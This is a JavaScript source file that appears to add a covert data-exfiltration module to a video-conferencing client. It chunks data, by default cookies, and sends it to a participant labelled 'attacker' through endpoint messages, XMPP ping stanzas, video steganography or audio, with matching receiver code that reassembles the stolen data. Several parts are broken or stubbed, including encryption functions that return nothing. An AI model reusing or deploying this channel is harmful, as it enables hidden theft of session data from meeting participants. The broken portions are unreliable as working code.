/* eslint-disable max-params */
/* global APP, splitString, getDefaultSettings */
import { $iq } from 'strophe.js';

import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

import VideoSteganoEffect from './VideoSteganoEffect';

export const defaultConfigurationValues = {
    method: 'endpoint',
    dataType: 'cookies',
    chunkSize: 5000,
    encryptionEnabled: true,
    pingInterval: 1000,
    debug: true
};

/**
 * Implementation of different convert channel methods
 */
class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'endpoint': CovertChannelMethods.useEndpoint,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio,
        'xmpp': CovertChannelMethods.useXMPP
    };

    /**
     * End hidden communication between users
     */
    static endCommunication(attackerId) {
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            isEnd: true
        });
        this.communicationEnded = true;
    }

    /**
     * Sending data using simple endpoint method
     * @param {any} data - specified data to be sent
     */
    static useEndpoint(data, attacker, configuration) {
        console.log('self check:', this);
        for (const chunkData of splitString(data, configuration.chunkSize)) {
            console.log('data:', chunkData);
            APP.conference.sendEndpointMessage(attacker.id, {
                extraction: 'reply',
                payload: chunkData
            });
        }
        CovertChannelMethods.endCommunication(attacker.id);
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @param {object} options - Options about the steganography. Throughtput etc.
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream, acquiredData: Object, options: Object) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, options));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    static useVideo(acquiredData, usedMethod) {
        const localVideo = APP.conference.localVideo;

        this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod).then(effect => {
            localVideo.setEffect(effect);
        });
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static useAudio(data) {
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;

        new AudioMixerEffect(desktopAudio).then(effect => {
            localAudio.setEffect(effect);
        });

    }

    /**
     *
     * @param {*} iq
     * @param {*} success
     * @param {*} error
     * @param {*} timeout
     */
    static ping(iq, success, error, timeout) {
        APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
            .then(success, error);
    }

    /**
     * Sends "ping" to given <tt>jid</tt>
     * @param jid the JID to which ping request will be sent.
     * @param success callback called on success.
     * @param error callback called on error.
     * @param timeout ms how long are we going to wait for the response. On
     * @param data to send
     * timeout <tt>error<//t> callback is called with undefined error argument.
     */
    static extractionPing(jid, success, error, timeout, data, type, id = '123', name = 'extraction') {
        const iq = $iq({
            type,
            to: jid,
            id
        });

        iq.c('ping', { xmlns: name,
            data });
        APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
            .then(success, error);
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static useXMPP(data, attacker, configuration, name = 'extraction') {
        const splitedData = splitString(data, configuration.chunkSize);

        console.log('Data:', splitedData);

        const intervalRef = setInterval(() => {
            if (!splitedData.length) {
                clearInterval(intervalRef);
                CovertChannelMethods.endCommunication(attacker.id);

                return;
            }
            console.log('attacker:', attacker);
            CovertChannelMethods.extractionPing(attacker.jid, e => {
                console.log('success', e, splitedData);
            }, e => {
                console.log('fail', e);
                console.log('Data sent:', splitedData);
            }, 5000, splitedData.shift(), 'get', '123', name);
        }, configuration.pingInterval);
    }
}

/**
 * Extracting data from covert channel
 */
class ExtractionCovertChannelMethods {

    // reference to all other methods
    static options = {
        'endpoint': ExtractionCovertChannelMethods.usedEndpoint,
        'video': ExtractionCovertChannelMethods.usedVideo,
        'audio': ExtractionCovertChannelMethods.usedAudio,
        'xmpp': ExtractionCovertChannelMethods.usedXMPP
    };

    /**
     * Receiving data using video stream
     */
    static usedVideo(user) {
        // define MediaRecorder of received stream
        const mediaRecorder = new MediaRecorder(user._tracks[0].stream);

        mediaRecorder.ondataavailable = blob => {
            blob.data.arrayBuffer().then(data => {
                console.log('Video:', data);
            });
        };
        mediaRecorder.start(100);
    }

    /**
     * Receiving data using xmpp ping
     */
    static usedXMPP(user, stackedData, name = 'extraction') {
        const handlerRef = APP.conference._room.xmpp.connection.addHandler(ping => {
            stackedData.push(ping.children[0].attributes.data.nodeValue);
            console.log('data:', stackedData);

            console.log('usedXMPP', user.jid, ping);

            CovertChannelMethods.extractionPing(user.jid,
                message => {
                    console.log('successful message recieved:', message);
                }, message => {
                    console.log('failed message recieved:', message);
                    console.log('Data received:', stackedData);
                }, 1000, '', 'result', ping.id, name);

            return true;
        }, name);
    }

    /**
     * Receiving data using audio stream
     */
    static usedAudio(user) {}

    /**
     * TODO: change this
     * not used anymore
     * Receiving data using audio stream
     */
    static usedEndpoint(user) {}
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
        this._fileBuffer = [];
        this.communicationEnded = false;
        this.nameOfCommunication = this.generateName();
    }

    /**
     *
     * @returns {string} generated name of the extraction channel
     */
    generateName() {
        if (this.configuration.debug) {
            return 'extraction';
        }

        return Math.random().toString(36)
            .substring(7);
    }

    /**
     * Setting AES key and IV
     */
    async initializeEncryption() {
        if (this.configuration.encryptionEnabled
                && !this.configuration.key && !this.configuration.iv) {
            this.configuration.key = await crypto.subtle.generateKey({ name: 'AES-GCM',
                length: 128 }, true, [ 'encrypt', 'decrypt' ]);

            // IV must be the same length (in bits) as the key
            this.configuration.iv = crypto.getRandomValues(new Uint8Array(16));
        }
    }

    /**
     * Looks if encryption is used in the communication
     * @returns {boolean}
     */
    enabledEncryption() {
        return this.configuration.encryptionEnabled
            && this.configuration.key instanceof CryptoKey
            && this.configuration.iv instanceof Uint8Array;
    }

    /**
     *
     * @param {*} buffer
     * @returns
     */
    arrayBufferToBase64(buffer) {
        let binary = '';
        const bytes = new Uint8Array(buffer);
        const len = bytes.byteLength;

        for (let i = 0; i < len; i++) {
            binary += String.fromCharCode(bytes[i]);
        }

        return window.btoa(binary);
    }


    /**
     *
     * @param {*} base64
     * @returns
     */
    base64ToArrayBuffer(base64) {
        const binaryString = window.atob(base64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);

        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        return bytes.buffer;
    }


    /**
     * Encrypts chunk of data
     * @param {object} data
     */
    async encrypt(data) {
        console.log('ENCRYPT:', data, this);
        await crypto.subtle.encrypt({ name: 'AES-GCM',
            tagLength: 32,
            iv: this.configuration.iv }, this.configuration.key, new TextEncoder().encode(data))
        .then(encryptedFile => this.arrayBufferToBase64(encryptedFile));
    }

    /**
     * Decrypts chunk of data
     * @param {object} data
     */
    async decrypt(data) {
        console.log('DECRYPT:', data, this);
        await crypto.subtle.decrypt({ name: 'AES-GCM',
            tagLength: 32,
            iv: this.configuration.iv }, this.configuration.key, this.base64ToArrayBuffer(data))
        .then(decryptedData => new TextDecoder().decode(decryptedData));

    }


    /**
     * getter for full file buffer
     */
    get fullData() {
        if (this._fileBuffer?.length) {
            return this._fileBuffer?.reduce((first, second) => first + second);
        }

        return '';
    }

    /**
     * Send all chunks to the attacker
     * @param {object} data To be sent
     * @param {string} attackerId
     */
    sendChunks(data, attackerId) {
        for (let chunkData of splitString(data, this.configuration.chunkSize)) {
            // send data using corresponding method
            if (this.enabledEncryption()) {
                console.log('ENCRYPT:', chunkData, this);
                chunkData = this.encrypt(chunkData);
            }
            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
        }
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    sendAll(data, attacker, dataSize = data.length) {
        // If the method can loose data through the transition send the final size of sent file.

        if (this.enabledEncryption()) {
            // TODO: make encryption work.
            this.encrypt(data).then(data => {
                CovertChannelMethods.options[this.configuration.method](data, attacker,
                        this.configuration, this.nameOfCommunication);
            });
        } else {
            CovertChannelMethods.options[this.configuration.method](data, attacker,
                    this.configuration, this.nameOfCommunication);
        }
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either endpoint text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receiveEndpointData(recievedData, event) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message
            if (event) {
                // Event for downloading extracted data at the end of extraction.
                // Define custom event 'extractionEnded' and trigger it.
                event.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: this.fullData,
                        config: this.configuration
                    }
                }));
            }
            this._fileBuffer = []; // empty the file buffer after ending communication.
            this.communicationEnded = true;

        } else if (this.enabledEncryption()) { // 'reply' containg encrypted data
            console.log('DECRYPT:', recievedData.payload, this);
            this.decrypt(recievedData.payload).then(data => {
                this._fileBuffer.push(data);
            });
        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    receiveAll(user) {
        // TODO: add generic code for all types of communication.
        ExtractionCovertChannelMethods.options[this.configuration.method](user, this._fileBuffer);
    }
}
